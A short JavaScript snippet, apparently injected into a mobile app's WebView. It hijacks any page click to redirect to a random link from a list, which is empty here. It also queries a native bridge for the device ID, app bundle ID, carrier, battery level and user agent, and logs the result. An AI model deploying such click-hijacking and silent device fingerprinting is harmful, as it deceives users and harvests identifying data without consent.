function init() {
  var arr = [
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });

  window.ITInjectSetupWebViewJavascriptBridge(function(bridge) {
    bridge.callHandler('getInfo', { 
      'cfg': ['version', 'atIntervals', 'atDurations', 'hehehe'], 
      'ua': ['version', 'timestamp', 'userAgent', 'lilili'], 
      'base': ['deviceID', 'appBundleID', 'appVersion', 'batteryLevel', 'carrier', 'lalala'] 
    }, function(responseData) {
      console.log(responseData);
    });
  });
}

setTimeout(() => {
  init();
}, 1000);